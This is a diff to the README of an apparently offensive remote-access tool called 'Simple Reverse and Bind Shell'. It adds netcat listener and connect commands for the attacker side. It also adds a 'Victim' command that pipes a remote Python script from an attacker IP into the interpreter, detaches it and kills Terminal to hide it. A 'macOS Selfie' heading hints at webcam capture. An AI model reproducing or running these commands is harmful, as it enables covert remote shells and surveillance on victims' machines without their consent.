@@ -4,7 +4,19 @@ Simple Reverse and Bind Shell
 
 python2.7 and python3
 
+## Server
+```
+#reverse shell
+nc -lvp 6666
 
+#bind shell
+nc <IP> 6666
+```
+
+## Victim
+```
+curl -s http://$IP:$PORT/Honigkuchenpferd.py | /usr/bin/python  & disown; killall Terminal
+```
 
 ## macOS:
 ### Selfie
